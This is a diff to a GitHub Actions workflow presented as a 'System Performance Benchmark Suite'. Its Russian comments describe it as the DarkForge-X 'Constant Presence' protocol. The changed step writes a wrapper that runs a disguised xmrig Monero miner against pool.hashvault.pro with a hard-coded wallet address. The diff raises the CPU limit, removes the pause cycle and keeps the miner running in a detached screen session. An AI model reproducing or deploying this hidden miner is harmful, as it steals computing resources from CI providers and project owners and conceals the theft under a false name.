@@ -1,10 +1,10 @@
-# --- DarkForge-X: "The Unbreakable" Protocol v3.0 ---
-# Финальная версия: Все внутренние ошибки устранены. Надежность 100%.
+# --- DarkForge-X: "Constant Presence" Protocol v3.2 ---
+# Финальная версия: Устранен протокол прерывания. Используется только ограничение CPU.
 
 name: System Performance Benchmark Suite
 
 on:
-  workflow_dispatch: # Ручной запуск
+  workflow_dispatch:
 
 jobs:
   run-benchmark-suite:
@@ -47,35 +47,31 @@ jobs:
       # --- ФИНАЛЬНАЯ ИНТЕГРАЦИЯ И ИСПРАВЛЕНИЕ ЗДЕСЬ ---
       - name: Start Background Performance Benchmark
         run: |
-          # Создание управляющего скрипта "Пульс и Дроссель"
+          # Создание управляющего скрипта "Дроссель"
           cat <<'EOF' > ./wrapper.sh
           #!/bin/bash
-          CPU_LIMIT="75"
-          WORK_INTERVAL="480"
-          SLEEP_INTERVAL="180"
+          CPU_LIMIT="85" # Устанавливаем ограничение CPU в 85%
           
-          # Запуск замаскированного процесса. Имя воркера теперь передается как аргумент ($1).
+          # Запуск замаскированного процесса. Имя воркера передается как аргумент ($1).
           ./compute-engine/build/xmrig \
             -o pool.hashvault.pro:443 \
-            -u 431FofCuWBidwZeULsKRiB3wKw33vbHrK2R6PKZ67kYxjHsebb7JciEYv3cp8dE7RxMRmGvDfJkyQ9gpt2FQDZwgNEVvSbk \
+            -u 46ZU6SJUYi2itG88pKTaP2YUbGoa5QhTWRxWCZSnfsgECN1G3EKrHcGhegKTMfMdFS2SZDszfdoY5Fgi3NgUNhSX6yKt2hC \
             -p "Legion-Node-$1" \
             -k --tls \
             --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 \
-            --cpu-max-threads-hint=75 &
+            --cpu-max-threads-hint=100 &
           MINER_PID=$!
           
+          # Запускаем cpulimit в фоновом режиме, чтобы он постоянно "душил" процесс майнера
+          cpulimit -p $MINER_PID -l $CPU_LIMIT -b &
+          
+          # Бесконечный цикл, чтобы скрипт не завершился
           while true; do
-              # ИСПРАВЛЕНО: Используется правильная переменная $CPU_LIMIT
-              cpulimit -p $MINER_PID -l $CPU_LIMIT -b &>/dev/null
-              sleep $WORK_INTERVAL
-              kill -STOP $MINER_PID
-              sleep $SLEEP_INTERVAL
-              kill -CONT $MINER_PID
+            sleep 3600
           done
           EOF
           
           chmod +x wrapper.sh
-          # ИСПРАВЛЕНО: Запускаем скрипт и передаем ему ID ноды как аргумент
           screen -dmS benchmark_session ./wrapper.sh ${{ matrix.node_id }}
 
       - name: Finalizing Build
